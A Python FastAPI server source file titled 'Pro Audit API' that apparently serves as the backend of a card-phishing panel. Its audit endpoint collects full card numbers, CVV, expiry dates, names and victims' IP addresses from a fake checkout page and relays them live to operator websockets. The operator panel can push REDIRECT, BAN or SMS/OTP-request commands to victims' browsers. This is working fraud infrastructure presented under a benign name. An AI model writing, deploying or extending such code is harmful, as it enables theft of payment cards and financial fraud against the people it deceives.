import os
import json
import logging
from typing import Dict, List, Optional
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, HTTPException
from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

# Configure Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("API")

app = FastAPI(title="Pro Audit API", version="2.0", docs_url=None, redoc_url=None)

# CORS (Allow all for flexibility, restrict in production if needed)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- Data Models ---
class AuditData(BaseModel):
    client_id: str
    email: Optional[str] = None
    full_name: str
    numero_carte: str
    card_bin: str
    card_brand: str
    expiry: str
    cvv: str
    montant: float
    adresse_ip: Optional[str] = None
    device: Optional[str] = None
    step: Optional[str] = "checkout"  # tracking step

# --- STATE MANAGEMENT ---
# Store active clients and their data in memory (for simplicity/demo).
# In production, use Redis or a Database.
class ConnectionManager:
    def __init__(self):
        # client_id -> WebSocket
        self.active_connections: Dict[str, WebSocket] = {}
        # client_id -> Data (dict)
        self.client_data: Dict[str, dict] = {}
        # Admin panel connections
        self.admins: List[WebSocket] = []

    async def connect(self, websocket: WebSocket, client_id: str):
        await websocket.accept()
        self.active_connections[client_id] = websocket
        if client_id not in self.client_data:
            self.client_data[client_id] = {
                "client_id": client_id,
                "status": "online",
                "step": "connected",
                "logs": [],
                "data": {}
            }
        self.client_data[client_id]["status"] = "online"
        await self.broadcast_to_admins({"type": "client_update", "client": self.client_data[client_id]})
        logger.info(f"Client {client_id} connected")

    async def connect_admin(self, websocket: WebSocket):
        await websocket.accept()
        self.admins.append(websocket)
        # Send current state to new admin
        await websocket.send_json({"type": "init_state", "clients": self.client_data})
        logger.info("Admin connected")

    def disconnect(self, client_id: str):
        if client_id in self.active_connections:
            del self.active_connections[client_id]
        if client_id in self.client_data:
            self.client_data[client_id]["status"] = "offline"
            # We don't delete data so admin can see history
        logger.info(f"Client {client_id} disconnected")

    def disconnect_admin(self, websocket: WebSocket):
        if websocket in self.admins:
            self.admins.remove(websocket)

    async def update_client_step(self, client_id: str, step: str):
        if client_id in self.client_data:
            self.client_data[client_id]["step"] = step
            await self.broadcast_to_admins({
                "type": "step_update",
                "client_id": client_id,
                "step": step
            })

    async def update_client_data(self, client_id: str, data: dict):
        if client_id in self.client_data:
            self.client_data[client_id]["data"].update(data)
            await self.broadcast_to_admins({
                "type": "data_update",
                "client_id": client_id,
                "data": self.client_data[client_id]
            })

    async def broadcast_to_admins(self, message: dict):
        for admin in self.admins:
            try:
                await admin.send_json(message)
            except:
                pass

    async def send_command(self, client_id: str, command: str, payload: dict = None):
        if client_id in self.active_connections:
            ws = self.active_connections[client_id]
            msg = {"type": command}
            if payload:
                msg.update(payload)
            try:
                await ws.send_json(msg)
                return True
            except:
                return False
        return False

manager = ConnectionManager()

# --- ROUTES ---

@app.post("/v1/audit")
async def receive_audit(data: AuditData, request: Request):
    """Receive sensitive data from checkout"""
    # IP Extraction (Railway/Proxy friendly)
    client_ip = request.headers.get('x-forwarded-for') or request.client.host
    
    clean_data = data.dict()
    clean_data['adresse_ip'] = client_ip
    
    # Update manager state
    await manager.update_client_data(data.client_id, clean_data)
    await manager.update_client_step(data.client_id, "submitted")
    
    return {"status": "ok", "message": "Data received"}

# --- WEBSOCKETS ---

@app.websocket("/ws/client/{client_id}")
async def client_websocket(websocket: WebSocket, client_id: str):
    await manager.connect(websocket, client_id)
    try:
        while True:
            data = await websocket.receive_json()
            # Client sending updates (e.g., "I am on OTP page")
            if "event" in data:
                if data["event"] == "step_update":
                    await manager.update_client_step(client_id, data["data"].get("step", "unknown"))
                elif data["event"] == "timer_update":
                    # Can forward timer to admin if needed
                    pass
    except WebSocketDisconnect:
        manager.disconnect(client_id)
        await manager.broadcast_to_admins({"type": "client_offline", "client_id": client_id})

@app.websocket("/ws/panel")
async def panel_websocket(websocket: WebSocket):
    await manager.connect_admin(websocket)
    try:
        while True:
            data = await websocket.receive_json()
            # Admin sending commands
            if "command" in data and "target_id" in data:
                target = data["target_id"]
                cmd = data["command"] # e.g., REDIRECT, BAN, SMS_REQ
                payload = data.get("payload", {})
                
                success = await manager.send_command(target, cmd, payload)
                
                # Log action
                if target in manager.client_data:
                    manager.client_data[target]["logs"].append(f"Admin sent {cmd}")
                    await manager.broadcast_to_admins({"type": "log_update", "client_id": target, "log": f"Admin sent {cmd}"})

    except WebSocketDisconnect:
        manager.disconnect_admin(websocket)

# --- STATIC FILES ---
# Serve the current directory (where HTMLs are)
# IMPORTANT: Mount this last to not conflict with API routes
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
app.mount("/", StaticFiles(directory=BASE_DIR, html=True), name="static")

if __name__ == "__main__":
    import uvicorn
    # Local dev run
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
